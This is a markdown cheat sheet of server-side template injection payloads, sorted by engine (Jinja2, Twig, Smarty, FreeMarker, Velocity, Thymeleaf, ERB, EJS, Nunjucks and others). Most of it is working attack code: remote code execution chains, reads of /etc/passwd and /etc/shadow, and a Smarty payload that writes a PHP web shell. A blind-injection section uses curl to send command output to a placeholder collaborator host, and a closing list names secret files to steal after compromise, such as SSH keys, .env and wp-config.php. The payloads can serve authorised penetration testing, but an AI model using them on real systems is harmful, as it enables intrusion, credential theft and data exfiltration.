# SSTI Payload Cheatsheet

Quick-reference payloads by engine. Start with detection, escalate to RCE.

---

## Detection (all engines — try all)

```
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
${{7*7}}
{{7*'7'}}
${{"a".toUpperCase()}}
{{dump(1)}}
[[${7*7}]]
```

---

## Jinja2 (Python)

| Goal | Payload |
|---|---|
| Confirm | `{{7*7}}` → 49 / `{{7*'7'}}` → 7777777 |
| Config dump | `{{config}}` |
| Env vars | `{{request.environ}}` |
| RCE (globals) | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| RCE (lipsum) | `{{lipsum.__globals__['os'].popen('id').read()}}` |
| RCE (cycler) | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| RCE (request) | `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
| File read | `{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}` |

---

## Twig (PHP)

| Goal | Payload |
|---|---|
| Confirm | `{{7*7}}` → 49 / `{{7*'7'}}` → 49 (not 7777777) |
| Env dump | `{{_self.env}}` |
| RCE (filter cb) | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
| RCE (map) | `{{["id"]\|map("system")\|join}}` |
| RCE (filter) | `{{['id']\|filter('system')}}` |
| File read | `{{source('/etc/passwd')}}` |

---

## Smarty (PHP)

| Goal | Payload |
|---|---|
| Confirm | `{7*7}` → 49 |
| Version | `{$smarty.version}` |
| RCE (php tag) | `{php}echo \`id\`;{/php}` |
| RCE (static) | `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}` |
| RCE (math) | `{math equation="0" format="%1\$s" a=system('id')}` |

---

## Mako (Python)

| Goal | Payload |
|---|---|
| Confirm | `${7*7}` → 49 |
| RCE (expression) | `${__import__('os').popen('id').read()}` |
| RCE (code block) | `<% import os; x=os.popen('id').read() %>${x}` |
| File read | `${open('/etc/passwd').read()}` |

---

## FreeMarker (Java)

| Goal | Payload |
|---|---|
| Confirm | `${7*7}` → 49 |
| Version | `${.version}` |
| RCE (Execute) | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| File read | `<#assign scanner=["java.util.Scanner"]?new(["java.io.File"]?new("/etc/passwd"))>${scanner.useDelimiter("\\Z").next()}` |

---

## Velocity (Java)

| Goal | Payload |
|---|---|
| Confirm | `#set($x=7*7)${x}` → 49 |
| RCE | `#set($rt=$class.inspect("java.lang.Runtime").type.getRuntime())#set($p=$rt.exec("id"))#set($br=["java.io.BufferedReader"]?new(["java.io.InputStreamReader"]?new($p.inputStream)))$br.readLine()` |

---

## Pebble (Java)

| Goal | Payload |
|---|---|
| Confirm | `{{7*7}}` → 49 |
| RCE | `{% set rt = "".__class__.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null) %}{% set cmd = rt.exec("id") %}{% set is = cmd.inputStream %}{% set isr = "".__class__.forName("java.io.InputStreamReader").__constructor__(is).newInstance(is) %}{% set br = "".__class__.forName("java.io.BufferedReader").__constructor__(isr).newInstance(isr) %}{{ br.readLine() }}` |

---

## Thymeleaf (Java / Spring)

| Goal | Payload |
|---|---|
| Confirm | `*{7*7}` → 49 / `[[${7*7}]]` → 49 |
| RCE | `*{T(java.lang.Runtime).getRuntime().exec('id')}` |
| RCE + output | `*{new java.util.Scanner(new java.lang.ProcessBuilder(new String[]{"id"}).start().getInputStream()).useDelimiter("\\A").next()}` |
| File read | `*{new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter("\\A").next()}` |
| Env | `*{T(java.lang.System).getenv()}` |

---

## ERB (Ruby / Rails)

| Goal | Payload |
|---|---|
| Confirm | `<%= 7*7 %>` → 49 |
| RCE | `<%= \`id\` %>` |
| RCE | `<%= IO.popen('id').read %>` |
| File read | `<%= File.read('/etc/passwd') %>` |

---

## EJS (JavaScript / Node.js)

| Goal | Payload |
|---|---|
| Confirm | `<%= 7*7 %>` → 49 |
| Node version | `<%= process.version %>` |
| RCE | `<%= require('child_process').execSync('id').toString() %>` |
| File read | `<%= require('fs').readFileSync('/etc/passwd','utf8') %>` |

---

## Pug / Jade (JavaScript / Node.js)

| Goal | Payload |
|---|---|
| Confirm | `#{7*7}` → 49 |
| RCE | `- var x = require('child_process').execSync('id').toString()\n= x` |
| RCE | `#{root.process.mainModule.require('child_process').execSync('id')}` |
| File read | `- var x = require('fs').readFileSync('/etc/passwd','utf8')\n= x` |

---

## Handlebars (JavaScript)

| Goal | Payload |
|---|---|
| Confirm | `{{7*7}}` → 7 (NOT 49 — logic-less engine) |
| RCE (< 4.7.7) | See SKILL.md Phase 4.12 for full prototype pollution chain |

---

## Nunjucks (JavaScript / Node.js)

| Goal | Payload |
|---|---|
| Confirm | `{{7*7}}` → 49 |
| RCE | `{{range.constructor("return global.process.mainModule.require('child_process').execSync('id').toString()")()}}` |

---

## Blind SSTI (OOB — replace URL with your collaborator)

```bash
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('curl http://OOB.URL/?x=$(id|base64)').read()}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("curl http://OOB.URL/?x=$(id|base64)")}

# ERB
<%= `curl http://OOB.URL/?x=$(id|base64)` %>

# EJS
<%= require('child_process').execSync('curl http://OOB.URL/?x=$(id|base64)') %>

# Velocity
#set($cmd="curl http://OOB.URL/?x=$(id|base64)")
... exec($cmd) ...
```

---

## Sensitive Files to Read After Gaining RCE

```
/etc/passwd
/etc/shadow
/proc/self/environ
/proc/self/cmdline
~/.ssh/id_rsa
.env
config/database.yml
/app/settings.py
/var/www/html/wp-config.php
/etc/nginx/nginx.conf
/etc/apache2/sites-enabled/000-default.conf
```
